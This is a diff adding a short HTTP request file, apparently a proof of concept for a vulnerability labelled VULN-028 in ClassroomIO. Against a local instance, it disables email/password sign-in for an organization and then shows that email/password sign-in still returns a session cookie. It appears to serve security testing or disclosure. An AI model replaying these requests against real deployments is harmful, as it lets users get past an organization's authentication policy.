@@ -1,0 +1,14 @@
+### VULN-028 — set the flag, then sign in with the 'disabled' method
+PUT http://localhost:21527/organization HTTP/1.1
+cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
+Content-Type: application/json
+Cookie: classroomio.session_token=<ADMIN>
+
+{"disableEmailPassword":true}
+
+### disabled — yet this still returns 200 + Set-Cookie:
+POST http://localhost:21527/api/auth/sign-in/email HTTP/1.1
+Origin: http://localhost:21526
+Content-Type: application/json
+
+{"email":"<admin>","password":"<admin>"}
